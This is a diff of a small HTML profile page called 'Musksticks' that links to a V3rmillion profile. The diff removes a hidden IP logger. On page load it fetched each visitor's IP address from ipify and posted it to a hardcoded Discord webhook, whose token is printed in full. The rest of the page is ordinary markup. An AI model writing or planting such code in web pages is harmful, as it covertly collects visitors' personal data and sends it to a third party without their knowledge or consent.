@@ -1,31 +1,4 @@
 <!DOCTYPE html>
-<html>
-    <body onload="sendMessage();">
-
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-    <script> $.getJSON("https://api.ipify.org?format=json", function(data) {$("#ip").html(data.ip);})</script>
-    <p id="ip"></p>
-    
-    <script>
-        function sendMessage(json) {
-        let ip = document.getElementById("ip").innerHTML;
-        const request = new XMLHttpRequest();
-        let a = "nPteRQXNw11pyinS-wqEhxcWEAPsy9qxl0qdWHQPbNHa97V_z8JUNUYDLu4LMBrggb_W"
-        request.open("POST", "https://discord.com/api/webhooks/1073586834787012749/"+a);
-
-        request.setRequestHeader('Content-type', 'application/json');
-
-        const params = {
-            username: "IP Logger",
-            avatar_url: "",
-            content: "**IP: **" + ip
-        }
-
-        request.send(JSON.stringify(params));
-        }
-    </script>
-</html>
-
 <html lang="en" data-color-mode="dark" data-dark-theme="dark"><head>
 <title>Musksticks</title>
 <link rel="icon" type="image/x-icon" href="assets\logo.png">
@@ -48,5 +21,4 @@
 <button style="width: 400px; left:-100px; height:40px" class="btn btn-block mb-2" type="button" onclick="window.open('https://v3rmillion.net/member.php?action=profile&amp;uid=1226479','_blank')"><img src="assets/V3rmillion.png" style="position:relative;width:19px;top:5px"> V3rmillion</button>
 </div>
 <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vaafb692b2aea4879b33c060e79fe94621666317369993" integrity="sha512-0ahDYl866UMhKuYcW078ScMalXqtFJggm7TmlUtp0UlD4eQk0Ixfnm5ykXKvGJNFjLMoortdseTfsRT8oCfgGA==" data-cf-beacon="{&quot;rayId&quot;:&quot;796b6f85cc5c3e69&quot;,&quot;version&quot;:&quot;2022.11.3&quot;,&quot;r&quot;:1,&quot;token&quot;:&quot;4f71789d045949ce9fbc9a9fb50ec322&quot;,&quot;si&quot;:100}" crossorigin="anonymous"></script>
-
 </body></html>
